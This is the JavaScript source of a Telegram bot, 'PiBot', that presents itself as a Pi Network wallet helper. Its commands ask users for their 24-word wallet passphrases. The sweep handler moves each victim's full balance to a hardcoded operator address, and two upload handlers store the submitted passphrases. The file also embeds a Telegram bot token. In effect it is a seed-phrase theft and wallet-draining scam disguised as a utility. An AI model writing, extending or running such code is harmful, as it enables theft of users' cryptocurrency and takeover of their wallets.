import TelegramBot from "node-telegram-bot-api";
import { getAccount, getAccountWithoutProxy, getBalance, getKeypairFromPassphrase, sleep, sweepWallet } from "./utils/fn.js";
import { storeLockedPi, storeSponsor } from "./utils/modelfn.js";

const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
console.log('Bot is running')



const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "Welcome to PiBot! Type /help to see commandsss.");
})

bot.onText(/\/help/, (msg) => {
    const helpText = `
        📘 PiBot Commands:
        /balance - Show Pi balance
        /claim - Claim unlocked Pi
        /status - Check bot status
        /sweep - sweeps all available pi
        /uploadPassphrase - Upload a locked pi wallet with your valid wallet address
        /uploadSponsor - Upload a pi wallet your unique name
        /stop - stops all running process
        `;
    bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
});

const userSessions = {};

bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space) OR Pi Wallet address');

    userSessions[chatId] = { waitingForPassphraseForBalance: true }
});

bot.onText(/\/sweep/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space) to start sweeping');

    userSessions[chatId] = { waitingForPassphraseForSweeping: true, stopAll: false }
});

bot.onText(/\/uploadPassphrase/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please send your 24-word passphrase followed by the wallet address.\n\nFormat:\n`word1 word2 ... word24 G...`', { parse_mode: 'Markdown' });
    userSessions[chatId] = { waitingForPassphraseAndAddress: true };
});

bot.onText(/\/uploadSponsor/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please send your 24-word passphrase followed by label.\n\nFormat:\n`word1 word2 ... word24 name`', { parse_mode: 'Markdown' });
    userSessions[chatId] = { waitingForPassphraseAndName: true };
});

bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Stopping any running process');

    userSessions[chatId]['stopAll'] = true;
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if(userSessions[chatId]?.waitingForPassphraseAndAddress) {
        const parts = text.split(/\s+/);
        const address = parts[parts.length - 1];
        const passphraseWords = parts.slice(0, -1);

        if(passphraseWords.length !== 24 || !/^G[A-Z2-7]{55}$/.test(address)) {
            return bot.sendMessage(chatId, '❌ Invalid format. Make sure you send 24 words followed by a valid wallet address (starts with G...)');
        }

        const passphrase = passphraseWords.join(' ');
        bot.sendMessage(chatId, `⏳ Validating and processing...`);

        try {
            const kp = getKeypairFromPassphrase(passphrase);
            const publicKey = kp.publicKey();

            const accountData = await getAccount(publicKey);

            const getReceiverAddressData = await getAccount(address);

            if(!accountData) {
                return bot.sendMessage(chatId, `❌ Invalid PI Wallet`);
            }

            if(!getReceiverAddressData) {
                return bot.sendMessage(chatId, `❌ Invalid Wallet address`);
            }

            bot.sendMessage(chatId, `✅ Passphrase derived public key: ${publicKey}`);
            
            const saved = await storeLockedPi(passphrase, publicKey, address)
            bot.sendMessage(chatId, `${saved.success ? '✅' : '❌' } ${ saved.message }`);

        } catch (error) {
            bot.sendMessage(chatId, '❌ Error processing the data. Ensure passphrase is correct.');
        }

        delete userSessions[chatId];
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if(userSessions[chatId]?.waitingForPassphraseAndName) {
        const parts = text.split(/\s+/);
        const name = parts[parts.length - 1];
        const passphraseWords = parts.slice(0, -1);

        console.log(`Passphrase: ${passphraseWords}, length: ${passphraseWords.length}`)
        console.log(`Name: ${name}`)

        return;

        if(passphraseWords.length !== 24 || name.length) {
            return bot.sendMessage(chatId, '❌ Invalid format. Make sure you send 24 words followed by a name');
        }

        if(name.length < 3) {
            return bot.sendMessage(chatId, '❌ Name must be 3 or more characters')
        }

        const passphrase = passphraseWords.join(' ');
        bot.sendMessage(chatId, `⏳ Validating and processing...`);

        try {
            const kp = getKeypairFromPassphrase(passphrase);
            const publicKey = kp.publicKey();

            const accountData = await getAccount(publicKey);

            if(!accountData) {
                return bot.sendMessage(chatId, `❌ Invalid PI Wallet`);
            }

            bot.sendMessage(chatId, `✅ Passphrase derived public key: ${publicKey}`);
            
            const saved = await storeSponsor(passphrase, name)
            bot.sendMessage(chatId, `${saved.success ? '✅' : '❌' } ${ saved.message }`);

        } catch (error) {
            bot.sendMessage(chatId, '❌ Error processing the data. Ensure passphrase is correct.');
        }

        delete userSessions[chatId];
    }
});


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    if(userSessions[chatId]?.waitingForPassphraseForSweeping) {
        while(!userSessions[chatId]?.stopAll) {
            const passphrase = msg.text.trim().toLocaleLowerCase();
            const words = passphrase.split(/\s+/);
            if(words.length !== 24) {
                return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
            }

            bot.sendMessage(chatId, '⏳ Sweeping Balance...');

            try {
                const kp = getKeypairFromPassphrase(passphrase)
                bot.sendMessage(chatId, `✅ Sender: ${kp.publicKey()}`);
                bot.sendMessage(chatId, `✅ Receiver: GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS`);

                const accountData = await getAccountWithoutProxy(kp.publicKey());
                const balanceString = getBalance(accountData);
                const balance = parseFloat(balanceString) - 0.98;

                if(balance - 0.01 <= 0) {
                    bot.sendMessage(chatId, `❌ Insufficient Balance: ${balance.toFixed(7)} PI`);
                } else {
                    const result = await sweepWallet(passphrase, MAIN_ADDRESS);
                    if(result.data && result.data.hash) {
                        return bot.sendMessage(chatId, `✅ ${result.amount} PI sweeped`);
                    } else {
                        bot.sendMessage(chatId, `❌ Sweeping failed`);
                    }
                }
            } catch(error) {
                bot.sendMessage(chatId, `❌ Something went wrong, please try again`);
            }

            await sleep(2000);
        }

        delete userSessions[chatId]
    }
})


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    try {
        if(userSessions[chatId]?.waitingForPassphraseForBalance) {
            const passphrase = msg.text.trim().toLocaleLowerCase();
            const words = passphrase.split(/\s+/);

            if(words.length === 1) {
                bot.sendMessage(chatId, '⏳ Checking validity of the address');
                const accountData = await getAccountWithoutProxy(passphrase.toUpperCase());
                if(!accountData.balances) {
                    return bot.sendMessage(chatId, '❌ Invalid wallet. Please send address starting with G....');
                } else {
                    const balanceString = getBalance(accountData);
                    const balance = parseFloat(balanceString) - 0.98;
                    return bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
                }
            }

            if(words.length !== 24) {
                return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
            }

            bot.sendMessage(chatId, '⏳ Checking Balance...');

            try {
                const kp = getKeypairFromPassphrase(passphrase)
                bot.sendMessage(chatId, `✅ Public key: ${kp.publicKey()}`);

                const accountData = await getAccountWithoutProxy(kp.publicKey());
                const balanceString = getBalance(accountData);
                const balance = parseFloat(balanceString) - 0.98;
                bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
            } catch(error) {
                bot.sendMessage(chatId, `❌ Failed to fetch balance. Please try again`);
            }

            // delete userSessions[chatId]
        }
    } catch(err) {
        delete userSessions[chatId]
        return bot.sendMessage(chatId, `❌ Unknown error occured`);
    }
})
